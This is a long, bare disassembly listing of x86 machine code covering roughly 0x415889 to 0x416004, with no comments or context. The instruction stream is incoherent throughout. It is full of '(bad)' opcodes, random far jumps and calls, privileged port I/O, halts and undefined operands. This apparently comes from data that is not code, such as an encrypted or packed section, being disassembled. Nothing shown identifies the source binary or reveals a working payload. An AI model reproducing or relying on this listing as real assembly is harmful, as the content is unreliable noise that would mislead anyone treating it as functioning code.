  415889:	pop    edi
  41588a:	popa   
  41588b:	jle    0x415822
  41588d:	sbb    esi,DWORD PTR [ebx]
  41588f:	mov    dh,0x56
  415891:	fsubr  QWORD PTR [ebx]
  415893:	jl     0x41590c
  415895:	cdq    
  415896:	push   ss
  415897:	call   0x95e7:0x1eed4c20
  41589e:	push   eax
  41589f:	xor    BYTE PTR [ebx+eiz*2],cl
  4158a2:	ins    BYTE PTR es:[edi],dx
  4158a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158a4:	test   BYTE PTR [eax],ch
  4158a6:	or     cl,BYTE PTR [ecx+eax*1+0x5e90e11f]
  4158ad:	loopne 0x415885
  4158af:	outs   dx,BYTE PTR ds:[esi]
  4158b0:	xchg   edx,eax
  4158b1:	arpl   di,dx
  4158b3:	mov    bl,0xa1
  4158b5:	ret    0xef93
  4158b8:	cmp    DWORD PTR [edx],esi
  4158ba:	inc    esi
  4158bb:	ja     0x4158a4
  4158bd:	xor    al,0x0
  4158bf:	fstp   TBYTE PTR [eax+0x63]
  4158c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158c3:	pop    esp
  4158c4:	jmp    0x1fae:0xc64490a0
  4158cb:	and    ecx,DWORD PTR [edi+0x13e6cbba]
  4158d1:	stos   DWORD PTR es:[edi],eax
  4158d2:	sub    al,0x42
  4158d4:	fxch   st(4)
  4158d6:	pop    eax
  4158d7:	fld    TBYTE PTR [eax+ebx*8-0x2636606]
  4158de:	nop
  4158df:	mov    esp,0x5ac640af
  4158e4:	in     al,0x57
  4158e6:	jmp    FWORD PTR [ebx+0x60]
  4158e9:	and    BYTE PTR [edx-0x31db3954],ah
  4158ef:	jns    0x5e1ecd79
  4158f5:	ins    BYTE PTR es:[edi],dx
  4158f6:	sbb    BYTE PTR [edx],0xe0
  4158f9:	dec    eax
  4158fa:	mov    ch,0x85
  4158fc:	inc    esi
  4158fd:	fistp  QWORD PTR [edx+0x69]
  415900:	punpcklbw mm3,DWORD PTR [esi+edi*4-0x943d68f]
  415908:	and    BYTE PTR [eax-0x5d],al
  41590b:	adc    ah,bl
  41590d:	jb     0x4158e1
  41590f:	hlt    
  415910:	pop    ds
  415911:	loope  0x41596e
  415913:	popa   
  415914:	cmp    BYTE PTR [edi+0x37f421b2],dl
  41591a:	dec    esi
  41591b:	jne    0x4158b3
  41591d:	out    dx,al
  41591e:	das    
  41591f:	test   DWORD PTR [edi-0x289da6c8],ecx
  415925:	sub    dl,dh
  415927:	jns    0x4158ca
  415929:	xchg   edx,eax
  41592a:	jnp    0x4158ac
  41592c:	mov    cl,0x81
  41592e:	in     eax,dx
  41592f:	push   ebp
  415930:	aam    0x32
  415932:	out    0x6b,al
  415934:	and    edx,DWORD PTR [edx+0x15]
  415937:	rol    DWORD PTR [edx-0x6375169e],1
  41593d:	aad    0x51
  41593f:	mov    ah,0xf5
  415941:	and    eax,0x6cdf8edc
  415946:	aas    
  415947:	pusha  
  415948:	repz xchg ecx,eax
  41594a:	jp     0x4159a7
  41594c:	mov    dl,0x61
  41594e:	mov    al,ds:0xbe45dae6
  415953:	test   DWORD PTR [edx],eax
  415955:	aas    
  415956:	jb     0x4159cb
  415958:	test   DWORD PTR [ebp+0x4b7e0b55],ebx
  41595e:	dec    ebx
  41595f:	xchg   edi,eax
  415960:	sub    eax,0xa9381f38
  415965:	jnp    0x415924
  415967:	inc    esi
  415968:	xor    edi,edi
  41596a:	dec    eax
  41596b:	sub    DWORD PTR [eax+eiz*1-0x30],ecx
  41596f:	inc    ebx
  415970:	mov    esp,0xd78efcd2
  415975:	fwait
  415976:	aam    0xd8
  415978:	(bad)  
  415979:	xor    al,0x1f
  41597b:	cmp    eax,DWORD PTR [esi-0x3ca1e30f]
  415981:	xchg   edi,eax
  415982:	mov    ah,0x19
  415984:	mov    edx,0x121368a9
  415989:	pusha  
  41598a:	adc    ecx,DWORD PTR [esi+0x3b]
  41598d:	sbb    dl,BYTE PTR [eax-0x8d88935]
  415993:	push   ebx
  415994:	push   esp
  415995:	lock data16 or cl,BYTE PTR [eax]
  415999:	xchg   BYTE PTR [ecx+0x3252c39b],ah
  41599f:	fld    QWORD PTR [eax+eiz*1-0x482e1059]
  4159a6:	leave  
  4159a7:	push   eax
  4159a8:	mov    ds:0x774d54dd,al
  4159ad:	xchg   ebp,eax
  4159ae:	out    dx,eax
  4159af:	sub    edx,DWORD PTR [esi+0x3a]
  4159b2:	or     BYTE PTR [eax-0x49],ah
  4159b5:	iret   
  4159b6:	fnstcw WORD PTR [eax-0xd]
  4159b9:	pop    edx
  4159ba:	and    eax,0x8dc4f22a
  4159bf:	int3   
  4159c0:	jecxz  0x41595e
  4159c2:	jne    0x415995
  4159c4:	inc    ecx
  4159c5:	push   ebp
  4159c6:	js     0x4159f0
  4159c8:	lea    esp,[esi+0x29dd8ba9]
  4159ce:	pop    ebx
  4159cf:	or     bh,BYTE PTR [ebx]
  4159d1:	dec    esi
  4159d2:	cmp    al,0xc2
  4159d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159d5:	push   0x4f986db2
  4159da:	cmp    DWORD PTR [ecx+ebp*8-0x3a13c727],esp
  4159e1:	and    BYTE PTR [ebx],ch
  4159e3:	enter  0xf93b,0x37
  4159e7:	inc    ebx
  4159e8:	sbb    al,0xaa
  4159ea:	fistp  QWORD PTR [eax-0x7cbb45ec]
  4159f0:	cmp    edi,edi
  4159f2:	pusha  
  4159f3:	mov    bh,0x8e
  4159f5:	adc    DWORD PTR [ecx-0x12],ecx
  4159f8:	leave  
  4159f9:	push   ds
  4159fa:	(bad)  [ecx+0xe2113b]
  415a00:	cmc    
  415a01:	(bad)  
  415a02:	sbb    al,al
  415a04:	pop    edi
  415a05:	pop    edi
  415a06:	inc    ebp
  415a07:	std    
  415a08:	mov    eax,ds:0xe113b8f0
  415a0d:	mov    eax,ds:0x99f02785
  415a12:	pop    esp
  415a13:	pop    esi
  415a14:	aas    
  415a15:	jmp    0x6db445b8
  415a1a:	cmp    DWORD PTR [edx-0x33f13851],eax
  415a20:	push   ecx
  415a21:	jo     0x4159ed
  415a23:	hlt    
  415a24:	les    sp,DWORD PTR [eax-0xf]
  415a28:	jg     0x415a42
  415a2a:	cli    
  415a2b:	retf   0x75a7
  415a2e:	nop
  415a2f:	adc    eax,0x36d445d1
  415a34:	cwde   
  415a35:	sbb    BYTE PTR [edx+0x3990d2ed],0x89
  415a3c:	jmp    0x97b6dcf
  415a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a42:	sub    al,0x49
  415a44:	pop    eax
  415a45:	xor    eax,0x44fa29d4
  415a4a:	push   edi
  415a4b:	in     al,0x8d
  415a4d:	repz imul edx,esi,0x17ebca8a
  415a54:	fidiv  DWORD PTR [ebx+0xf]
  415a57:	mov    ds:0x2f7ddd4d,al
  415a5c:	xor    bh,BYTE PTR ds:[ebp+0x61365bac]
  415a63:	mov    BYTE PTR [edx],bh
  415a65:	hlt    
  415a66:	test   al,0x76
  415a68:	sahf   
  415a69:	xchg   ebx,eax
  415a6a:	dec    ebx
  415a6b:	iret   
  415a6c:	dec    ecx
  415a6d:	sub    al,al
  415a6f:	xchg   ebp,eax
  415a70:	cmp    al,BYTE PTR [eax-0x5463db20]
  415a76:	sar    DWORD PTR ds:0xf3c2afef,0xe9
  415a7d:	jg     0x415a58
  415a7f:	dec    edx
  415a80:	lea    ebx,[ebx+0x74]
  415a83:	in     al,dx
  415a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a85:	sub    BYTE PTR [esi+0x51],ah
  415a88:	xor    DWORD PTR [ebx+esi*1],ecx
  415a8b:	ror    DWORD PTR [ebp+0x729c0284],1
  415a91:	xor    al,BYTE PTR [eax]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	stc    
  415aa5:	or     esp,DWORD PTR [edi+0x25]
  415aa8:	mov    eax,0xb9707f0d
  415aad:	jle    0x415b1f
  415aaf:	jo     0x415a3c
  415ab1:	cmp    edx,DWORD PTR [edx]
  415ab3:	and    al,BYTE PTR [eax+0x60]
  415ab6:	popf   
  415ab7:	scas   al,BYTE PTR es:[edi]
  415ab8:	xchg   bp,ax
  415aba:	pop    ebx
  415abb:	sahf   
  415abc:	xchg   ebx,eax
  415abd:	xchg   edi,eax
  415abe:	inc    ecx
  415abf:	lock mov edx,ebx
  415ac2:	adc    al,0x66
  415ac4:	sti    
  415ac5:	inc    eax
  415ac6:	inc    eax
  415ac7:	xchg   ecx,eax
  415ac8:	sbb    ah,bl
  415aca:	test   BYTE PTR [eax],ah
  415acc:	les    esi,FWORD PTR [edi+0xfbf4379]
  415ad2:	mov    cl,0x48
  415ad4:	xchg   al,bh
  415ad6:	test   al,0xdd
  415ad8:	test   eax,0xc9419c8f
  415add:	xchg   esp,eax
  415ade:	push   esi
  415adf:	push   ebp
  415ae0:	mul    DWORD PTR [eax+0x3492c119]
  415ae6:	pop    ss
  415ae7:	pop    ebx
  415ae8:	sbb    eax,DWORD PTR [edx-0x28]
  415aeb:	push   esp
  415aec:	hlt    
  415aed:	div    BYTE PTR [ecx]
  415aef:	cmp    DWORD PTR [esi+0x6c2eb8ff],edx
  415af5:	sbb    ebp,DWORD PTR [edi]
  415af7:	in     al,dx
  415af8:	iret   
  415af9:	lea    esi,[esi+0x1c5ed093]
  415aff:	stc    
  415b00:	lds    ecx,FWORD PTR [edx+0x5e1fdd98]
  415b06:	pop    ecx
  415b07:	stos   DWORD PTR es:[edi],eax
  415b08:	mov    dh,0x1b
  415b0a:	sub    edx,DWORD PTR [edi-0x54]
  415b0d:	sbb    edi,ebp
  415b0f:	or     edx,DWORD PTR [edx+0xa81846c]
  415b15:	hlt    
  415b16:	lahf   
  415b17:	mov    edi,0xadf33a9b
  415b1c:	stos   DWORD PTR es:[edi],eax
  415b1d:	shr    bl,0xe6
  415b20:	ds jnp 0x415b05
  415b23:	adc    ah,BYTE PTR [esi+0x1430f3aa]
  415b29:	mov    bh,BYTE PTR [edx]
  415b2b:	out    0x9d,al
  415b2d:	cmp    DWORD PTR [eax],0x73
  415b30:	retf   
  415b31:	retf   
  415b32:	nop
  415b33:	push   ecx
  415b34:	pinsrw mm2,WORD PTR [ecx],0x9e
  415b38:	dec    eax
  415b39:	mov    dh,ch
  415b3b:	jb     0x415afa
  415b3d:	aam    0x79
  415b3f:	(bad)  
  415b40:	scas   al,BYTE PTR es:[edi]
  415b41:	ret    0xee9f
  415b44:	lods   al,BYTE PTR ds:[esi]
  415b45:	js     0x415ad0
  415b47:	xor    BYTE PTR [esi],0xfb
  415b4a:	aas    
  415b4b:	ror    DWORD PTR [edx-0x3a],cl
  415b4e:	mov    al,ds:0x92c4448a
  415b53:	mov    ds:0x50311a76,al
  415b58:	mov    al,ds:0x8ac46f80
  415b5d:	sbb    dh,bl
  415b5f:	xchg   esp,eax
  415b60:	push   cs
  415b61:	sub    eax,0x17de0c89
  415b66:	push   eax
  415b67:	popf   
  415b68:	stos   DWORD PTR es:[edi],eax
  415b69:	retf   
  415b6a:	outs   dx,BYTE PTR ds:[esi]
  415b6b:	add    eax,0xd7270f69
  415b70:	retf   0x6d27
  415b73:	cli    
  415b74:	cmp    al,0x11
  415b76:	pop    esp
  415b77:	cli    
  415b78:	outs   dx,BYTE PTR ds:[esi]
  415b79:	or     dl,BYTE PTR [ebx-0x6e9b8632]
  415b7f:	jns    0x415bae
  415b81:	cmp    eax,0x465f0667
  415b86:	fsub   DWORD PTR [edx+0x2cd16c33]
  415b8c:	out    dx,al
  415b8d:	ins    DWORD PTR es:[edi],dx
  415b8e:	or     BYTE PTR ss:[ebx-0x25],ch
  415b92:	cmp    eax,0xd907442e
  415b97:	repnz ins BYTE PTR es:[edi],dx
  415b99:	lds    ebp,FWORD PTR [esi-0x35bc6a2a]
  415b9f:	xor    al,0xec
  415ba1:	into   
  415ba2:	push   ecx
  415ba3:	loopne 0x415b80
  415ba5:	shl    BYTE PTR ds:0x298228df,cl
  415bab:	xlat   BYTE PTR ds:[ebx]
  415bac:	stos   BYTE PTR es:[edi],al
  415bad:	pop    ds
  415bae:	push   esi
  415baf:	sbb    ah,0xe2
  415bb2:	je     0x415b81
  415bb4:	or     DWORD PTR [ecx],ebx
  415bb6:	xchg   BYTE PTR [esi],ch
  415bb8:	mov    ds:0x1ac48137,al
  415bbd:	sbb    eax,0x6f0a85d9
  415bc2:	add    BYTE PTR [esi],0x36
  415bc5:	test   BYTE PTR [edi+0x6a],dh
  415bc8:	add    DWORD PTR [ebx+0x5be10484],esi
  415bce:	mov    ch,0x32
  415bd0:	add    DWORD PTR [edi],eax
  415bd2:	into   
  415bd3:	lods   eax,DWORD PTR ds:[esi]
  415bd4:	jg     0x415bd8
  415bd6:	sub    DWORD PTR [ebx+0x27e196aa],eax
  415bdc:	xchg   DWORD PTR [edx+ebx*2+0x2],edi
  415be0:	fcomp  DWORD PTR [edx-0x7e]
  415be3:	rcr    BYTE PTR [edi-0x3b],cl
  415be6:	pop    es
  415be7:	std    
  415be8:	push   esi
  415be9:	cdq    
  415bea:	dec    ebx
  415beb:	xchg   ecx,eax
  415bec:	repnz fisttp QWORD PTR [edi+0x3e]
  415bf0:	jnp    0x415c5c
  415bf2:	icebp  
  415bf3:	cdq    
  415bf4:	xor    eax,0x8ae6fdc7
  415bf9:	inc    ebp
  415bfa:	xlat   BYTE PTR ds:[ebx]
  415bfb:	addr16 addr16 inc ebx
  415bfe:	jp     0x415bbd
  415c00:	mov    ebx,0x1d99941d
  415c05:	xor    DWORD PTR [edi-0x6f],ebx
  415c08:	gs mov esi,0x39455eec
  415c0e:	inc    edx
  415c0f:	js     0x415bc2
  415c11:	lods   al,BYTE PTR ds:[esi]
  415c12:	sbb    eax,0xf4521825
  415c17:	rcr    DWORD PTR [edi],cl
  415c19:	mov    edi,0x70ee30fc
  415c1e:	push   0xccfd1a32
  415c23:	mov    dh,0x25
  415c25:	arpl   WORD PTR ss:[esi+0x71ff280f],bp
  415c2c:	jns    0x415c47
  415c2e:	inc    ecx
  415c2f:	mov    ch,0x8b
  415c31:	xchg   ebp,eax
  415c32:	mov    cl,0x42
  415c34:	inc    edi
  415c35:	xchg   ebx,eax
  415c36:	inc    edi
  415c37:	pop    ds
  415c38:	and    DWORD PTR [esp+ebp*1-0x3a],0xffffff92
  415c3d:	imul   edx,DWORD PTR [esi],0x65cdf2d7
  415c43:	mov    bl,0xce
  415c45:	(bad)  
  415c46:	repz mov dl,dl
  415c49:	jmp    0x415c97
  415c4b:	rcl    DWORD PTR [edi+0x29],cl
  415c4e:	push   ecx
  415c4f:	or     eax,0x2e2319c7
  415c54:	ror    DWORD PTR [ebx],0xcf
  415c57:	sahf   
  415c58:	data16 xor BYTE PTR [eax+0x624fe1ca],bh
  415c5f:	adc    BYTE PTR [esi+ecx*2-0x1ee4180b],0x8b
  415c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c68:	iret   
  415c69:	push   0x7946cbf9
  415c6e:	xor    bh,BYTE PTR [ebx+eiz*1+0x319f8832]
  415c75:	jne    0x415c5b
  415c77:	pop    ds
  415c78:	in     eax,dx
  415c79:	push   eax
  415c7a:	int3   
  415c7b:	jp     0x415cc7
  415c7d:	gs pop ebx
  415c7f:	mov    ah,0xd1
  415c81:	xchg   DWORD PTR [eax],esp
  415c83:	cmp    dh,ch
  415c85:	rcl    dl,0x1
  415c88:	push   esp
  415c89:	mov    esp,0xe82d63ad
  415c8e:	mov    WORD PTR [edi],cs
  415c90:	dec    ebp
  415c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c92:	pop    esp
  415c93:	push   esi
  415c94:	lods   eax,DWORD PTR ds:[esi]
  415c95:	iret   
  415c96:	xchg   ebp,eax
  415c97:	test   ecx,esp
  415c99:	cmove  edx,DWORD PTR [ebx+0x33b9ea0c]
  415ca0:	jge    0x415c51
  415ca2:	out    dx,eax
  415ca3:	sub    ebp,ebp
  415ca5:	ins    BYTE PTR es:[edi],dx
  415ca6:	push   edx
  415ca7:	xlat   BYTE PTR ds:[ebx]
  415ca8:	dec    edx
  415ca9:	or     BYTE PTR [ecx],dh
  415cab:	jg     0x415d04
  415cad:	fistp  QWORD PTR [edx+0x41]
  415cb0:	shl    ebp,1
  415cb2:	pop    ds
  415cb3:	mov    ebp,0xa3c78b97
  415cb8:	adc    esi,DWORD PTR [ebx]
  415cba:	xchg   edx,eax
  415cbb:	cld    
  415cbc:	popf   
  415cbd:	or     ch,BYTE PTR [esi+edi*4]
  415cc0:	dec    ecx
  415cc1:	and    bh,BYTE PTR [esi]
  415cc3:	retf   0xcb23
  415cc6:	xchg   ebx,eax
  415cc7:	pop    ebx
  415cc8:	(bad)  [esi+0x100c0740]
  415cce:	jnp    0x415d1e
  415cd0:	or     bl,bl
  415cd2:	test   DWORD PTR [esi],edi
  415cd4:	and    al,0x23
  415cd6:	jno    0x415c84
  415cd8:	adc    DWORD PTR [edx-0x51],esp
  415cdb:	and    DWORD PTR [eax-0x6e],eax
  415cde:	ret    0xbe2f
  415ce1:	or     ecx,DWORD PTR [ecx+0x31]
  415ce4:	shr    DWORD PTR [ebx],0xfa
  415ce7:	jp     0x415d5b
  415ce9:	fadd   DWORD PTR [esp+ebx*2+0x5f]
  415ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cee:	mov    cl,0x76
  415cf0:	push   edi
  415cf1:	jecxz  0x415c9b
  415cf3:	mov    ds:0x52ad0f9f,eax
  415cf8:	sbb    cl,cl
  415cfa:	ror    DWORD PTR [edi+0x436cb9b6],0x5a
  415d01:	add    edi,DWORD PTR [eax-0x60026714]
  415d07:	mov    esi,0x5ba2caea
  415d0c:	loopne 0x415d4b
  415d0e:	out    dx,al
  415d0f:	dec    edi
  415d10:	cmp    eax,0x2acdffae
  415d15:	jle    0x415c9f
  415d17:	aaa    
  415d18:	mov    cl,0xdf
  415d1a:	call   0x8e97430a
  415d1f:	out    0xcc,eax
  415d21:	hlt    
  415d22:	or     BYTE PTR [ebx],ah
  415d24:	xor    BYTE PTR [esi],0xd0
  415d27:	sbb    esp,DWORD PTR [edx]
  415d29:	push   0xffffffd8
  415d2b:	in     al,0x67
  415d2d:	arpl   WORD PTR [edx-0x83409ec],cx
  415d33:	dec    esi
  415d34:	lahf   
  415d35:	scas   eax,DWORD PTR es:[edi]
  415d36:	sahf   
  415d37:	(bad)  
  415d38:	or     BYTE PTR [ebx],bl
  415d3a:	in     al,dx
  415d3b:	sahf   
  415d3c:	hlt    
  415d3d:	push   0xffffffba
  415d3f:	outs   dx,BYTE PTR ds:[esi]
  415d40:	aad    0x13
  415d42:	arpl   WORD PTR [esi-0x17],ax
  415d45:	inc    ebx
  415d46:	jns    0x415d17
  415d48:	arpl   WORD PTR [edi-0x39651364],bp
  415d4e:	push   0xffffffd9
  415d50:	ja     0x415d8b
  415d52:	sbb    al,BYTE PTR [ebp-0x4c]
  415d55:	xor    esp,DWORD PTR [edi-0x49]
  415d58:	push   esp
  415d59:	(bad)  
  415d5a:	out    0x3a,al
  415d5c:	into   
  415d5d:	(bad)  
  415d5f:	call   0xaebd5684
  415d64:	and    eax,0x4e76512b
  415d69:	dec    edx
  415d6a:	(bad)  
  415d6b:	in     al,0xe6
  415d6d:	xchg   edx,eax
  415d6e:	retf   0x88d6
  415d71:	retf   0x7f92
  415d74:	pop    eax
  415d75:	cdq    
  415d76:	ret    0x558b
  415d79:	or     BYTE PTR [ebx+0x489dc7d],cl
  415d7f:	xchg   edi,eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	xlat   BYTE PTR ds:[ebx]
  415d95:	push   ecx
  415d96:	cdq    
  415d97:	inc    ecx
  415d98:	or     DWORD PTR [edx],0x7eb9707f
  415d9e:	jo     0x415e10
  415da0:	popf   
  415da1:	mov    eax,0x6f962403
  415da6:	push   esi
  415da7:	dec    ebp
  415da8:	or     BYTE PTR [ecx+ebp*8],ah
  415dab:	sub    eax,0xa2d1f250
  415db0:	and    BYTE PTR [edi-0x39436513],bh
  415db6:	shr    ecx,0xb9
  415db9:	in     al,0x15
  415dbb:	call   0x11e32770
  415dc0:	push   es
  415dc1:	adc    BYTE PTR [edi-0x36f9488a],dl
  415dc7:	rcr    DWORD PTR [ebx],0x88
  415dca:	fld    st(5)
  415dcc:	hlt    
  415dcd:	sbb    ebx,DWORD PTR [ebx+0x39]
  415dd0:	xchg   DWORD PTR [edx+0x15c08176],ebp
  415dd6:	sbb    BYTE PTR [edx],0x75
  415dd9:	pop    ecx
  415dda:	sub    eax,0xafb145fc
  415ddf:	cmp    BYTE PTR [eax],bl
  415de1:	cmp    dl,BYTE PTR [ebp-0x7a0153e1]
  415de7:	mov    ah,0xdd
  415de9:	je     0x415e3a
  415deb:	cmp    DWORD PTR [ebx],esi
  415ded:	mov    ebx,0x4d5523c6
  415df2:	stc    
  415df3:	loop   0x415e2e
  415df5:	add    al,0xec
  415df7:	in     eax,0xa4
  415df9:	adc    esp,0xffffffaf
  415dfc:	dec    esi
  415dfd:	mov    WORD PTR [eax-0x1fda170a],?
  415e03:	mov    BYTE PTR [ebp+0x4],bl
  415e06:	mov    bh,0x3d
  415e08:	push   edi
  415e09:	loop   0x415e2c
  415e0b:	outs   dx,DWORD PTR ds:[esi]
  415e0c:	fdivr  st,st(1)
  415e0e:	mov    DWORD PTR [edi],eax
  415e10:	push   cs
  415e11:	rol    DWORD PTR [esi-0x502e60b7],1
  415e17:	cli    
  415e18:	jle    0x415dd2
  415e1a:	sbb    ecx,DWORD PTR [edx]
  415e1c:	mov    ebp,0xe1aff89d
  415e21:	xchg   edi,eax
  415e22:	xchg   esp,eax
  415e23:	dec    ebp
  415e24:	jno    0x415e86
  415e26:	(bad)  
  415e27:	fisubr DWORD PTR [ebx]
  415e29:	add    ah,BYTE PTR [esp+edi*8+0x68]
  415e2d:	push   cs
  415e2e:	dec    ecx
  415e2f:	cmp    BYTE PTR [esi],ch
  415e31:	jp     0x415e58
  415e33:	pop    ebp
  415e34:	scas   eax,DWORD PTR es:[edi]
  415e35:	push   0xffffffff
  415e37:	xchg   edx,eax
  415e38:	dec    ebp
  415e39:	das    
  415e3a:	cld    
  415e3b:	and    eax,0x7e0914fe
  415e40:	(bad)  
  415e41:	and    eax,0x8ab06760
  415e46:	or     DWORD PTR ss:[ebp-0x1baf763],eax
  415e4d:	std    
  415e4e:	adc    eax,0xc96587ef
  415e53:	and    dh,ch
  415e55:	mov    ah,0xfd
  415e57:	jmp    0x4761d7a0
  415e5c:	and    DWORD PTR [esi-0x589e820e],edi
  415e62:	cmp    esi,DWORD PTR [ebp+0x34]
  415e65:	add    al,al
  415e67:	jbe    0x415e29
  415e69:	stc    
  415e6a:	cmp    al,0x86
  415e6c:	fist   DWORD PTR [ebx]
  415e6e:	out    0x5f,eax
  415e70:	adc    eax,DWORD PTR [eax+0x6c2e7035]
  415e76:	aaa    
  415e77:	pop    esi
  415e78:	into   
  415e79:	js     0x415e31
  415e7b:	xchg   cl,al
  415e7d:	xchg   al,dh
  415e7f:	mov    WORD PTR [ebp-0x9],es
  415e82:	retf   0xb73e
  415e85:	icebp  
  415e86:	aad    0x30
  415e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e89:	pushf  
  415e8a:	repnz dec eax
  415e8c:	push   ebx
  415e8d:	mov    ch,0x0
  415e8f:	in     al,0xde
  415e91:	push   ebx
  415e92:	and    BYTE PTR [eax-0x31],ah
  415e95:	inc    eax
  415e96:	in     al,dx
  415e97:	mov    eax,0x45064372
  415e9c:	pop    ebx
  415e9d:	cmp    esi,edi
  415e9f:	sbb    ch,BYTE PTR [ebx+0x3b]
  415ea2:	mov    ebp,0xa764ac4
  415ea7:	lods   eax,DWORD PTR ds:[esi]
  415ea8:	add    ch,BYTE PTR [eax]
  415eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eab:	stc    
  415eac:	push   esi
  415ead:	xchg   ebp,eax
  415eae:	ss mov eax,0x16131b85
  415eb4:	cld    
  415eb5:	outs   dx,BYTE PTR ds:[esi]
  415eb6:	mov    BYTE PTR [edx-0x6c],cl
  415eb9:	jbe    0x415f18
  415ebb:	jmp    ebx
  415ebd:	xor    eax,0x83827144
  415ec2:	call   0xc29d4699
  415ec7:	inc    edx
  415ec8:	sub    ecx,ebp
  415eca:	lea    eax,[eax-0x3ed8ef7b]
  415ed0:	dec    edx
  415ed1:	add    DWORD PTR [ebp-0x28fb95d8],0x20a9afa6
  415edb:	test   al,0x8
  415edd:	adc    eax,0xec09e40c
  415ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ee3:	out    0x8b,al
  415ee5:	jmp    0x415e7f
  415ee7:	jmp    0x415e8b
  415ee9:	mov    WORD PTR [ebx-0x56bef270],es
  415eef:	mov    ds:0xe046306b,al
  415ef4:	std    
  415ef5:	shr    BYTE PTR [esi+0x42],0xfa
  415ef9:	inc    ecx
  415efa:	mov    esi,0xf5554056
  415eff:	push   0x38bfe62e
  415f04:	mov    al,ds:0xb21106
  415f09:	or     DWORD PTR [eax+0x18],eax
  415f0c:	xchg   esi,eax
  415f0d:	or     dl,BYTE PTR [ebp+eax*4+0x6c]
  415f11:	xchg   esi,eax
  415f12:	scas   eax,DWORD PTR es:[edi]
  415f13:	push   esp
  415f14:	mov    BYTE PTR [edx],bh
  415f16:	push   esi
  415f17:	or     BYTE PTR [ecx-0x72],bl
  415f1a:	das    
  415f1b:	mov    WORD PTR [edi],?
  415f1d:	xor    BYTE PTR [esi],al
  415f1f:	mov    ds:0x384229e4,eax
  415f24:	inc    ebp
  415f25:	stos   DWORD PTR es:[edi],eax
  415f26:	(bad)  
  415f27:	icebp  
  415f28:	rcr    BYTE PTR [edx],cl
  415f2a:	shr    DWORD PTR [eax-0x605abc6c],0x7a
  415f31:	fild   WORD PTR [edx+0x43b654a6]
  415f37:	pop    ebx
  415f38:	push   ecx
  415f39:	sti    
  415f3a:	mov    al,0x6
  415f3c:	ret    
  415f3d:	mov    dl,0xe4
  415f3f:	arpl   WORD PTR ds:0x18e9055a,bp
  415f45:	and    eax,0x42606845
  415f4a:	aaa    
  415f4b:	fistp  QWORD PTR [ecx]
  415f4d:	imul   ecx,DWORD PTR [ebp-0x18],0xffffffc3
  415f51:	xor    al,BYTE PTR [ecx+0x6ae44407]
  415f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f58:	mov    eax,ds:0xc59944ba
  415f5d:	shr    BYTE PTR [ebp-0x1b],0x82
  415f61:	scas   al,BYTE PTR es:[edi]
  415f62:	pushf  
  415f63:	xchg   esp,eax
  415f64:	xchg   BYTE PTR [ebx],dh
  415f66:	bound  edx,QWORD PTR [esi+0x79]
  415f69:	jmp    0x415fc0
  415f6b:	jo     0x415fa8
  415f6d:	repz clc 
  415f6f:	fstp   QWORD PTR [eax+0x1b]
  415f72:	pop    ecx
  415f73:	push   0x68
  415f75:	cmp    esp,ebp
  415f77:	push   es
  415f78:	pop    eax
  415f79:	ror    DWORD PTR [ebp+0x18603b04],1
  415f7f:	and    DWORD PTR gs:[ebx-0x6b],esp
  415f83:	in     al,0xca
  415f85:	cmp    bl,dl
  415f87:	repz and al,0x4d
  415f8a:	adc    cl,al
  415f8c:	call   0x73fb:0x6cd13fa5
  415f93:	hlt    
  415f94:	enter  0xb554,0x13
  415f98:	shl    DWORD PTR [ecx+0xb],cl
  415f9b:	ret    0x1eda
  415f9e:	jge    0x415f2e
  415fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fa1:	sbb    cl,dl
  415fa3:	push   0xfffffff6
  415fa5:	jle    0x415f29
  415fa7:	stos   DWORD PTR es:[edi],eax
  415fa8:	ins    BYTE PTR es:[edi],dx
  415fa9:	hlt    
  415faa:	push   cs
  415fab:	(bad)  
  415fac:	mov    eax,ds:0x2777ff75
  415fb1:	cld    
  415fb2:	dec    edi
  415fb3:	inc    ecx
  415fb4:	fimul  WORD PTR ds:0xff89aa9d
  415fba:	scas   al,BYTE PTR es:[edi]
  415fbb:	xor    bl,BYTE PTR [ebx-0x42fe0c3f]
  415fc1:	inc    ebx
  415fc2:	jge    0x416027
  415fc4:	xor    eax,0x47a01c74
  415fc9:	adc    eax,0x899d878c
  415fce:	xor    al,0xe3
  415fd0:	je     0x415fbc
  415fd2:	pop    ebx
  415fd3:	(bad)  
  415fd4:	cld    
  415fd5:	(bad)  
  415fd6:	xchg   ecx,eax
  415fd7:	cmc    
  415fd8:	bound  esi,QWORD PTR [eax-0x1c]
  415fdb:	cmp    eax,0xab461f3a
  415fe0:	stc    
  415fe1:	xchg   ecx,eax
  415fe2:	and    BYTE PTR [esi-0x3351e077],ah
  415fe8:	sub    DWORD PTR [ebx+eax*1+0x24],esi
  415fec:	push   edx
  415fed:	mov    WORD PTR [edi-0x27],es
  415ff0:	pushf  
  415ff1:	iret   
  415ff2:	dec    esp
  415ff3:	add    BYTE PTR [esi-0x2b],bh
  415ff6:	addr16 pop ds
  415ff8:	mov    ecx,0x15a23869
  415ffd:	push   0xffffffe3
  415fff:	stos   DWORD PTR es:[edi],eax
  416000:	dec    BYTE PTR [ebx]
  416002:	cmp    bh,dl
  416004:	int    0xad
